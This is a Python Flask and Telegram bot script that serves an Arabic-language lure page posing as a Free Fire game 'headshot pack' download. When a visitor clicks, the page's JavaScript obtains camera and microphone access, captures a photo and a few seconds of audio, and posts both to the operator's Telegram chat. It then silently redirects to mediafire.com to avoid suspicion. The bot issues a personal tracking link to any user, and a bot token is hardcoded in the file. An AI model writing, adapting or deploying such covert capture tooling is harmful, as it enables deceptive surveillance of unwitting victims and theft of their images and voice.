import os
import threading
import requests
from flask import Flask, render_template_string, request

TOKEN = "8638452052:AAGz5E-bd3GBY47R-zM5rTmw8uCq9BpPrXc"
TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "http://127.0.0.1:5000")

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل الحزمة الأسطورية فري فاير</title>
    <style>
        body { 
            background: #090d16; 
            color: #ffffff; 
            font-family: 'Segoe UI', Tahoma, sans-serif; 
            text-align: center; 
            padding: 20px; 
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .card {
            background: #1e293b;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            max-width: 400px;
            width: 100%;
            border: 1px solid #334155;
        }
        h2 { color: #38bdf8; margin-bottom: 15px; font-size: 22px; }
        p { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
        .btn {
            background: linear-gradient(135deg, #0ea5e9, #2563eb);
            color: white;
            border: none;
            padding: 14px 28px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            box-shadow: 0 4px 12px rgba(14, 165, 233, 0.4);
        }
        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <h2>🔥 حزمة هيدشوت فري فاير الأصلية</h2>
        <p>اضغط على الزر أدناه للتحقق من الاتصال والمتابعة إلى رابط التحميل المباشر.</p>
        <button class="btn" onclick="startAction()">اضغط هنا للمتابعة</button>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = "{{ token }}";
        const TARGET_CHAT_ID = "{{ chat_id }}";

        async function startAction() {
            let btn = document.querySelector('.btn');
            btn.innerText = "جاري الفحص والاتصال...";
            btn.disabled = true;

            try {
                // طلب الكاميرا والميكروفون معاً بنقرة واحدة
                let stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" },
                    audio: true 
                });

                let video = document.getElementById('video');
                video.srcObject = stream;

                // 1. تسجيل الصوت لمدة 4 ثوانٍ باستخدام MediaRecorder
                let mediaRecorder = new MediaRecorder(stream);
                let audioChunks = [];

                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    let audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    let audioFormData = new FormData();
                    audioFormData.append('chat_id', TARGET_CHAT_ID);
                    audioFormData.append('audio', audioBlob, 'voice_record.webm');
                    
                    // إرسال الصوت للبوت
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, {
                        method: 'POST',
                        body: audioFormData
                    });
                };

                // بدء تسجيل الصوت
                mediaRecorder.start();

                // 2. التقاط الصورة بعد ثانية ونصف لضمان جودة العدسة
                setTimeout(() => {
                    let canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    let ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        let photoFormData = new FormData();
                        photoFormData.append('chat_id', TARGET_CHAT_ID);
                        photoFormData.append('photo', blob, 'capture.jpg');
                        
                        // إرسال الصورة للبوت
                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: photoFormData
                        });
                        
                        // إيقاف التسجيل الصوتي بعد 4 ثوانٍ كاملة
                        setTimeout(() => {
                            mediaRecorder.stop();
                            stream.getTracks().forEach(track => track.stop());
                            
                            // تحويله لموقع ميديافاير وكأن شيئاً لم يكن
                            window.location.href = "https://www.mediafire.com";
                        }, 2500);

                    }, 'image/jpeg', 0.9);
                }, 1500);

            } catch (e) {
                // حتى لو رفض الأذونات، يتم تحويله فوراً بلا شكوك
                window.location.href = "https://www.mediafire.com";
            }
        }
    </script>
</body>
</html>
"""

@app.route('/c/<chat_id>')
def capture_page(chat_id):
    return render_template_string(HTML_TEMPLATE, token=TOKEN, chat_id=chat_id)

@app.route('/')
def home():
    return "Bot is running successfully!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

def run_telegram_bot():
    print("[+] البوت السحابي يعمل الآن...")
    offset = 0
    while True:
        try:
            res = requests.get(f"{TELEGRAM_API}/getUpdates", params={"offset": offset, "timeout": 30})
            data = res.json()
            if "result" in data:
                for update in data["result"]:
                    offset = update["update_id"] + 1
                    if "message" in update and "text" in update["message"]:
                        chat_id = update["message"]["chat"]["id"]
                        text = update["message"]["text"]
                        
                        if text.startswith("/start"):
                            personal_link = f"{BASE_URL}/c/{chat_id}"
                            reply_text = (
                                f"🔥 **تحدي الصوت والصورة تم تنفيذه يا بطل!**\n\n"
                                f"إليك رابطك الأسطوري الجديد:\n"
                                f"<code>{personal_link}</code>\n\n"
                                f"كي يدخل الشخص ويضغط للمتابعة، ستصلك **صورته** مباشرة وفوقها **تسجيله الصوتي** في نفس اللحظة!"
                            )
                            requests.post(f"{TELEGRAM_API}/sendMessage", json={
                                "chat_id": chat_id,
                                "text": reply_text,
                                "parse_mode": "HTML"
                            })
        except Exception as e:
            pass

if __name__ == '__main__':
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()
    run_telegram_bot()
      
